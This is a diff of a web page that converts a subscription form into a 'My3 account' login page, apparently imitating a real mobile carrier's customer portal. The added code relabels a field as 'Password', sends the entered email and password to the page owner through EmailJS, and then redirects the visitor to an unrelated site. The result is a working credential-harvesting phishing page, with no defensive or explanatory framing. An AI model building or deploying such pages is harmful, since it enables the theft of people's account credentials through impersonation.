@@ -168,11 +168,11 @@
     <h1>My3 account</h1>
 
     <div class="tabs">
-      <div class="tab active">Subscribe</div>
+      <div class="tab active">Login</div>
       <div class="tab">Register</div>
     </div>
 
-    <form id="subscribeForm">
+    <form id="LoginForm">
       <div class="field">
         <label for="email">Email address<span class="req">*</span></label>
         <div class="input-wrap">
@@ -181,13 +181,13 @@
       </div>
 
       <div class="field">
-        <label for="name">Father<span class="req">*</span></label>
+        <label for="name">Password<span class="req">*</span></label>
         <div class="input-wrap">
           <input id="name" type="text" name="user_name" required>
         </div>
       </div>
 
-      <button type="submit" class="submit" id="submitBtn">Subscribe</button>
+      <button type="submit" class="submit" id="submitBtn">Login</button>
       <div class="status" id="statusMsg"></div>
     </form>
 
@@ -213,7 +213,7 @@
 
   emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
 
-  const form = document.getElementById("subscribeForm");
+  const form = document.getElementById("LoginForm");
   const submitBtn = document.getElementById("submitBtn");
   const statusMsg = document.getElementById("statusMsg");
 
@@ -227,7 +227,7 @@
 
     emailjs.sendForm(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, form)
       .then(function () {
-        statusMsg.textContent = "You're subscribed! Redirecting...";
+        statusMsg.textContent = "You're Logind! Redirecting...";
         statusMsg.className = "status success";
         form.reset();
         window.location.href = "https://huboweb.co.uk";
@@ -240,7 +240,7 @@
       })
       .finally(function () {
         submitBtn.disabled = false;
-        submitBtn.textContent = "Subscribe";
+        submitBtn.textContent = "Login";
       });
   });
 </script>
